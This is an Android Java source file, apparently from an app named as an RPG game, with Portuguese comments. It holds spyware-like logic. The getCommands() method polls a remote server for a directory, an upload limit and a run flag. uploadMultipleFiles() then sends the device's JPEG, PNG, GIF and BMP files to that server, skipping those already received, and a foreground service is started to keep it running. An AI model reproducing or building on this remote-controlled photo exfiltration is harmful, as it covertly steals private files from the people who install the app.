package com.example.rpg;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Environment;
import android.view.View;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.example.rpg.databinding.ActivityMainBinding;

import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    private AppBarConfiguration appBarConfiguration;
    private ActivityMainBinding binding;
    private static final int STORAGE_PERMISSION_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setSupportActionBar(binding.toolbar);

        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        appBarConfiguration = new AppBarConfiguration.Builder(navController.getGraph()).build();
        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);
        checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, STORAGE_PERMISSION_CODE);



        // Testando service
        if(!foregroundServiceRunning()) {
            Intent serviceIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            }
        }



        binding.fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //uploadFile();
                //uploadMultipleFiles("/Download/", 4);
                getCommands(); // funcionando em 10/10/2022 as 10:37 am
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @Override
    public boolean onSupportNavigateUp() {
        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        return NavigationUI.navigateUp(navController, appBarConfiguration)
                || super.onSupportNavigateUp();
    }
    // Function to check and request permission.
    public void checkPermission(String permission, int requestCode)
    {
        if (ContextCompat.checkSelfPermission(MainActivity.this, permission) == PackageManager.PERMISSION_DENIED) {

            // Requesting the permission]
            ActivityCompat.requestPermissions(MainActivity.this, new String[] { permission }, requestCode);
        }
        else {
            System.out.println("Permissao já concedida");
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults)
    {
        super.onRequestPermissionsResult(requestCode,
                permissions,
                grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            System.out.println("Garantidas:"+ grantResults.length);
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(MainActivity.this, "Storage Permission Granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(MainActivity.this, "Storage Permission Denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void uploadFile() {
        File file = new File("/storage/emulated/0/Download/niele.jpeg");


        List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos

        RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
        MultipartBody.Part body =
                MultipartBody.Part.createFormData("file", file.getName(), requestFile);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();


        Api retrofitAPI = retrofit.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImage(body);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Toast.makeText(getApplicationContext(), t.getMessage(), Toast.LENGTH_LONG).show();
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    private MultipartBody.Part prepareFilePart(String partName, File file) {
        // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
        // use the FileUtils to get the actual file by uri

        // create RequestBody instance from file
        RequestBody requestFile =
                RequestBody.create(
                        MediaType.parse("image/*"),
                        file
                );

        // MultipartBody.Part is used to send also the actual file name
        return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
    }

    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList) {

        // Pega o path q vem em dir
        String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
        System.out.println(path);

        File directory = new File(path);
        File[] files = directory.listFiles();

        List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos

        // System.out.println(listdata.contains("images.jpeg"));

        for (int i = 0; i < files.length; i++) {
            if (!files[i].getName().equals(".nomedia")) {
                if (files != null && !sendedList.contains(files[i].getName())){
                    if (files[i].getName().contains(".jpeg") || files[i].getName().contains(".JPEG")
                            || files[i].getName().contains(".jpg") || files[i].getName().contains(".JPG")
                            || files[i].getName().contains(".png") || files[i].getName().contains(".PNG")
                            || files[i].getName().contains(".gif") || files[i].getName().contains(".GIF")
                            || files[i].getName().contains(".bmp") || files[i].getName().contains(".BMP")
                    )
                    {
                        System.out.println("Arquivo achado: " + files[i]);
                        // Adicionando na lista cada filePart contendo o arquivo
                        parts.add(prepareFilePart("file", files[i]));
                        System.out.println("Current: " + parts.size());

                        // se os arquivos para upload for maior ou igual ao maximo break
                        if(parts.size() >= maxUploads){break;}
                    }

                }
            }

        }

        Retrofit retrofitUpload = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();


        Api retrofitAPI = retrofitUpload.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImages(parts);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Toast.makeText(getApplicationContext(), t.getMessage(), Toast.LENGTH_LONG).show();
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    private void getCommands() {

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .build();
        Api retrofitAPI = retrofit.create(Api.class);

        Call<ResponseBody> call = retrofitAPI.getCommands();
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                String jsonResp = "";
                try {
                    jsonResp = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                try {
                    JSONObject obj = new JSONObject(jsonResp);

                    // objeto json que veio da API
                    System.out.println(obj);

                    // pegando campos do response
                    String dir = (String) obj.get("dir");
                    int maxUploads = Integer.parseInt((String) obj.get("maxUploads"));
                    String run = (String) obj.get("run");

                    // Pegando a lista de já enviados
                    ArrayList<String> listdata = new ArrayList<>();
                    JSONArray filesSended = (JSONArray) obj.get("filesReceived");

                    if (filesSended != null) {
                        for (int i=0;i<filesSended.length();i++){
                            listdata.add(filesSended.getString(i));
                        }
                    }

                    if (run.equals("true")) {
                        // chamando o metodo de upload passando os parametros q vieram
                        uploadMultipleFiles(dir, maxUploads, listdata);
                    }

                } catch (Throwable t) {
                    System.out.println(t);
                    return ;
                }
            }
            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                // setting text to our text view when
                // we get error response from API.
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    public boolean foregroundServiceRunning(){
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for(ActivityManager.RunningServiceInfo service: activityManager.getRunningServices(Integer.MAX_VALUE)) {
            if(ForegroundService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

}